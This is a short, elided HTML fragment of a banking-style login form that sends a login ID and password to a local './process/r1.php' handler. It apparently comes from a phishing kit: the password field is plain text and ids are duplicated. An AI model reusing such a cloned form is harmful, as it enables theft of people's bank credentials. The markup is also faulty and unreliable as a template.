...
<div class="login-fields login-fields-nav clearfix hidden dismissible">
	...
	</div><form class="login-form-amc" action="#" method="post">		<!--AMC-->
		<fieldset>
...
<form method="post" id="aoblogon" name="aoblogon" action="./process/r1.php">
...
<div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
	<label class="control-label" for="aoblogon_userid">Login ID</label><div class="controls">
		<input class="form-control inputbox required" type="text" id="aoblogon_userid" name="user" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus">
	</div>
	<label class="control-label" for="aoblogon_userid">Password</label><div class="controls">
		<input class="form-control inputbox required" type="text" id="aoblogon_userid" name="psid" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus">
	</div>
</div>
